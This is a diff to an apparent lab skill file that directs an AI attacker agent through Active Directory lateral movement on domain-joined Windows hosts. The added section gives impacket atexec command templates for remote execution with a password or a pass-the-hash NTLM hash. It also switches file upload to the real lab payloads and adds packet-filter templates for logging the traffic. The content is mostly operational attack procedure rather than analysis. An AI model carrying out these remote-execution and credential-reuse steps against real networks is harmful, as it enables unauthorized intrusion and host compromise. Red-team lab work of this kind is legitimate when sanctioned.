@@ -1,6 +1,6 @@
 ---
 name: ad-lateral
-description: Lateral-movement Active Directory skill for an attacker agent on a domain-joined Windows host. Covers pass-the-hash, remote shells, delegation, pass-the-ticket, WinRM, and scheduled tasks. Load this skill when the task names ad-lateral. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
+description: Lateral-movement Active Directory skill for an attacker agent on a domain-joined Windows host. Covers pass-the-hash, remote shells, one read-only remote query, delegation, pass-the-ticket, WinRM, and scheduled tasks. Load this skill when the task names ad-lateral. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
 ---
 
 # AD Lateral Movement Skill
@@ -432,7 +432,7 @@ ip.addr == <attacker-ip> && ip.addr == <target-ip> && (kerberos || smb || msrpc 
 
 Purpose: upload a tool to a share on a target host.
 
-Inputs: a user object with `password` from `users`, the target host and share name from `hosts`, and a local tool from `campaign` (`campaign.tools_dir` + a name in `campaign.tools`). If `campaign.tools` is empty, create a small benign tool file in `campaign.tools_dir` on the attack host first, record its name in `campaign.tools`, then proceed.
+Inputs: a user object with `password` from `users`, the target host and share name from `hosts`, and a local tool from `campaign` (`campaign.tools_dir` + the `tool` intent, or one name in `campaign.tools`). When `campaign.tools` lists the lab payloads, upload that file and do not create a substitute. If the file is missing, mark the technique `failed`; the operator creates it with `attacker/seed_lab_files.ps1 -Role Attacker`.
 
 Procedure (one atomic action — connect, upload one file, exit):
 
@@ -514,6 +514,60 @@ Outputs: mark the host `compromised`; record any files of interest under `files`
 
 Rollback: if task creation is denied, `mark-stale` the host and re-run `discovery.port-scan`.
 
+
+Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
+
+```
+python scripts/write_filter.py --expression "<filled display filter>"
+```
+
+Template:
+
+```
+ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
+```
+
+
+## 3.16 Remote Read-Only Query
+- Technique id: `lateral.remote-query`
+- ATT&CK: T1047 (Windows Management Instrumentation), T1082 (System Information Discovery), T1083 (File and Directory Discovery)
+
+Purpose: run one read-only command on a target. Do not open an interactive shell.
+
+Inputs: a user object with `password` or `ntlm_hash` from `users`, the target host, and a `query` intent from the task text. Allowed queries:
+
+| query | command |
+|-------|---------|
+| `systeminfo` | `systeminfo` |
+| `whoami` | `whoami` |
+| `hostname` | `hostname` |
+| `ipconfig` | `ipconfig /all` |
+| `net-user` | `net user` |
+| `tasklist` | `tasklist` |
+| `sc-query` | `sc query` |
+| `dir` | `dir /a "<path>"` |
+
+`dir` requires the task's `path` intent. Any other query is a failure; do not invent a command.
+
+Procedure (one atomic action). Password form:
+
+```
+python -m impacket.examples.atexec <domain.name>/<user>:<password>@<target-ip> "<command>"
+```
+
+Hash form when only `ntlm_hash` is known:
+
+```
+python -m impacket.examples.atexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip> "<command>"
+```
+
+Outputs: mark the host `compromised` when the command is accepted, and record a note:
+
+```
+python scripts/state.py add notes '{"text": "remote query <query> on <target-ip>"}'
+```
+
+Rollback: if the command is rejected, `mark-stale` the credential or the host and do not retry a different query inside this task.
 
 Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
 
